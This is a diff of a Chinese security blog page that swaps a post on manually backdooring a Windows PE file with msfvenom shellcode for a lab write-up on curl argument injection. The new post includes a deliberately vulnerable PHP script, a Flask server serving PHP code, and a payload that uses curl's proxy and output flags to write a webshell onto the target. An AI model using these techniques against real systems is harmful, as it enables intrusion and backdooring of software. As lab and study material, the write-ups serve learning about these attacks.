@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>PE注入 | 九世的博客</title>
-  <meta name="keywords" content=" 后门 ">
-  <meta name="description" content="PE注入 | 九世的博客">
+  <title>bash curl参数注入题目 | 九世的博客</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="bash curl参数注入题目 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1391,9 +1391,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-PE注入" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-bash-curl参数注入题目" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">PE注入</h1>
+        <h1 class="article-title">bash curl参数注入题目</h1>
     
     <div class="article-meta">
         
@@ -1402,14 +1402,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">后门</a>
+            <a href="javascript:" class="color3">靶场</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-12-18 18:26:31">2019-12-18 17:00</time>
+        创建时间:<time class="date" title="更新时间: 2020-05-01 13:02:06">2020-05-01 12:42</time>
         
     </div>
     <div class="article-meta">
@@ -1431,7 +1431,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实验"><span class="toc-text">实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现过程"><span class="toc-text">复现过程</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1446,67 +1446,50 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上在先知社区看见一篇手动PE注入的文章。看起来挺感兴趣，研究了一下<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576669956890&amp;di=e9cbb8db1d6e158ce9582ac2ed35968c&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff5e33db662e3f26526b0b1c234c55512534dac28.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1576669956890&amp;di=e9cbb8db1d6e158ce9582ac2ed35968c&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff5e33db662e3f26526b0b1c234c55512534dac28.jpg"></p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>OS:windows 7
-工具:
-LordPE
-OD
-HxD
-PESecurity-master https://github.com/NetSPI/PESecurity
-</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>首先实验PEsecurity检查是否有ASLR</p>
-<blockquote>
-<p>ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的</p>
-</blockquote>
-<p><img src="https://s2.ax1x.com/2019/12/18/Q7OXFg.png" alt="Q7OXFg.png"></p>
-<p>无ASLR，那么使用LordPE打开，并新建一个区段<br><img src="https://s2.ax1x.com/2019/12/18/Q7Xgcn.md.png" alt="Q7Xgcn.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/12/18/Q7jK3j.md.png" alt="Q7jK3j.md.png"></p>
-<p>由于新加了一个区段，EXE现在无法打开，使用HxD插入1000个00（就是虚拟大小）<br><img src="https://s2.ax1x.com/2019/12/18/Q7vpZV.png" alt="Q7vpZV.png"></p>
-<p>测试能否正常打开<br><img src="https://s2.ax1x.com/2019/12/18/Q7vfFU.png" alt="Q7vfFU.png"></p>
-<p>OD打开找到添加的区段<br><img src="https://s2.ax1x.com/2019/12/18/Q7vbex.png" alt="Q7vbex.png"></p>
-<p>将入口点改为</p>
-<pre><code>jmp 00412000
-</code></pre><p><img src="https://s2.ax1x.com/2019/12/18/Q7xQ00.png" alt="Q7xQ00.png"></p>
-<p>之后单独保存为一个exe，然后在打开右键跟随jmp就可以去到定义的空白区段了<br><img src="https://s2.ax1x.com/2019/12/18/Q7x2jA.png" alt="Q7x2jA.png"></p>
-<p>msfvenom生成一个弹Messagebox的shellcode（32位）</p>
-<pre><code>msfvenom -p windows/messagebox text=&quot;it&#39;s demo&quot; -f hex
-</code></pre><p>（懒得在生成一遍）<br><img src="https://s2.ax1x.com/2019/12/18/Q7xxEV.png" alt="Q7xxEV.png"><br>复制生成的shellcode，然后在空白区段选中大部分，二进制-&gt;二进制粘贴<br><img src="https://s2.ax1x.com/2019/12/18/Q7zEHx.png" alt="Q7zEHx.png"></p>
-<p>之后在保存执行即可看见效果<br><img src="https://s2.ax1x.com/2019/12/18/Q7zK8e.png" alt="Q7zK8e.png"></p>
-<p>恢复程序正常执行，既然执行了我们要的玩意那么就要恢复原来的程序正常执行<br>PS：生成什么反弹meterpreter和执行命令的shellcode，之后之后貌似无法还原。。。一堆几把问题。弄了一下午</p>
-<p>先打开未被修改过的exe在和修改过的exe对比入口点<br><img src="https://s2.ax1x.com/2019/12/18/Q7z6aV.png" alt="Q7z6aV.png"></p>
-<p>执行完上面的之后可以看到进入了下一个区段，把区段的地址拿出来</p>
-<pre><code>00405331  |.  68 A0614000   push Hash.004061A0
-</code></pre><p>最后得出要修改的</p>
-<pre><code>push ebp
-mov ebp,esp
-push -0x1
-jmp 00405331
--------------------------------------------------
-00412103    90              nop
-00412104    9D              popfd //恢复堆栈
-00412105    61              popad //恢复堆栈
-00412106    55              push ebp
-00412107    8BEC            mov ebp,esp
-00412109    6A FF           push -0x1
-0041210B  - E9 2132FFFF     jmp Hash7.00405331 //跳转到下一个区段00405331
-</code></pre><p>找到shellcode最后的call然后替换为上面的<br>（修改前）<br><img src="https://s2.ax1x.com/2019/12/18/Q7zqPO.png" alt="Q7zqPO.png"></p>
-<p>（修改后）<br><img src="https://s2.ax1x.com/2019/12/18/QHSZss.png" alt="QHSZss.png"></p>
-<p>在另存为一个单独的exe，效果如下<br><img src="https://s2.ax1x.com/2019/12/18/QHSTyj.gif" alt="QHSTyj.md.gif"></p>
-<p>执行calc的<br><img src="https://s2.ax1x.com/2019/12/18/QHpVfO.gif" alt="QHpVfO.md.gif"></p>
-<p>为了把calc弄的和上面可以正常返回，开始了折腾数小时的操作…..</p>
-<ul>
-<li>popfd和popad不行 X</li>
-<li>堆栈平衡，calc好像弹不出 X</li>
-</ul>
-<p>堆栈平衡：shellcode之前的ESP-shellcode执行之后的ESP=差值<br><img src="https://s2.ax1x.com/2019/12/18/QH9S4f.png" alt="QH9S4f.png"></p>
-<p><img src="https://s2.ax1x.com/2019/12/18/QH94MQ.md.png" alt="QH94MQ.md.png"></p>
-<p>尝试F8到calc弹出之后在返回 X<br><img src="https://s2.ax1x.com/2019/12/18/QHCAzD.md.png" alt="QHCAzD.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/12/18/QHClJf.gif" alt="QHClJf.md.gif"></p>
-<p>尝试和原文反弹nc和meterpreter的，可以是可以。问题和上面如上，不过nc反弹的话海星<br><img src="https://s2.ax1x.com/2019/12/18/QHPMnJ.md.png" alt="QHPMnJ.md.png"></p>
-<p><img src="https://s2.ax1x.com/2019/12/18/QHPGh6.png" alt="QHPGh6.png"></p>
-<p>后面十分纠结…问了某dalao说是shellcode的问题</p>
-<p>由于本人太垃圾没有找到解决的方法，待定…..</p>
-<p>自动化的工具使用：<br>[kali linux捆绑工具shellter的安装及使用(<a href="https://blog.csdn.net/qq_34444097/article/details/79573798" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/79573798</a>)</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://haiderm.com/fully-undetectable-backdooring-pe-file/" target="_blank" rel="noopener">Fully undetectable backdooring PE file</a><br><a href="https://xz.aliyun.com/t/6939#toc-4" target="_blank" rel="noopener">手工shellcode注入PE文件 - 先知社区</a><br><a href="https://bbs.pediy.com/thread-247370.htm" target="_blank" rel="noopener">[原创]使用“PE文件加区段工具”、“LordPE”、“WinHex”、“OllyDbg”为PE文件添加section、dll（API）-『软件逆向』-看雪安全论坛</a><br><a href="http://4hou.win/wordpress/?cat=5644" target="_blank" rel="noopener">PE文件 – backup</a></p>
+        <p>昨天在星球里，见到P神的题目的答案。研究了一下，顺便复现一下因此有了这篇博文</p>
+<pre><code>昂热并不太相信诅咒这种东西，他是那种要斩破命运的男人，
+可当他觉察到上杉越和源稚生可能是父子的时候，还是觉得被某种类似命运的东西击中了
+</code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="php">&lt;?php
+if($_GET[&#39;name&#39;]){
+        $name=$_GET[&#39;name&#39;];
+        $command=&quot;curl http://127.0.0.1/test.php?jack=$name&quot;;
+        echo $command.&quot;&lt;br&gt;&quot;;
+        system($command);
+}elseif($_GET[&#39;jack&#39;]){
+        echo $_GET[&#39;jack&#39;];
+}else{
+        echo &quot;Not GET name&quot;;
+}
+?&gt;
+</code></pre>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>request Testing<br><img src="https://s1.ax1x.com/2020/05/01/JOfQYR.png" alt=""></p>
+<p>尝试直接注入命令是不行的<br><img src="https://s1.ax1x.com/2020/05/01/JOfUTH.png" alt=""></p>
+<p>curl <a href="http://127.0.0.1/test.php?jack=$name" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=$name</a> 的时候<br>执行的时候被当做url了，就是：<a href="http://127.0.0.1/test.php?jack=1&amp;&amp;whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=1&amp;&amp;whoami</a><br>所以是没有办法直接注入命令然后执行的</p>
+<p>但是当curl ”<a href="http://127.0.0.1/test.php?jack=$name“" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=$name“</a> 明确的标明了url，就可以直接注入命令</p>
+<p>这时只能通过命令本身的方法来进行操控，通过使用页面下载和代理的方法可以getshell</p>
+<p>使用flask创建个Server</p>
+<pre><code class="python">from flask import Flask
+from werkzeug.routing import BaseConverter
+class RegexConverter(BaseConverter):
+    def __init__(self, map, *args):
+        self.map = map
+        self.regex = args[0]
+
+app = Flask(__name__)
+app.url_map.converters[&#39;regex&#39;] = RegexConverter
+
+@app.route(&#39;/&lt;regex(&quot;.*&quot;):url&gt;&#39;)
+def index(url):
+    return &quot;&lt;?php phpinfo();?&gt;&quot;
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;)
+</code></pre>
+<p>curl -x 说明<br><img src="https://s1.ax1x.com/2020/05/01/JOhwbF.png" alt=""></p>
+<p>payload：</p>
+<pre><code>http://192.168.241.174/test.php?name=phpinfo%20-x%20http://192.168.1.106:5000/%20-o%20jack.php
+</code></pre><p><img src="https://s1.ax1x.com/2020/05/01/JOhr59.md.png" alt=""></p>
+<p><img src="https://s1.ax1x.com/2020/05/01/JOhcgx.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1516,12 +1499,12 @@ jmp 00405331
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>PE注入</p>
+    <p><span class="copy-title">文章标题:</span>bash curl参数注入题目</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-12-18, 17:00:34</p>
-    <p><span class="copy-title">最后更新:</span>2019-12-18, 18:26:31</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/76f3e4e2.html" title="PE注入">http://422926799.github.io/posts/76f3e4e2.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-05-01, 12:42:48</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-01, 13:02:06</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/409da64c.html" title="bash curl参数注入题目">http://422926799.github.io/posts/409da64c.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
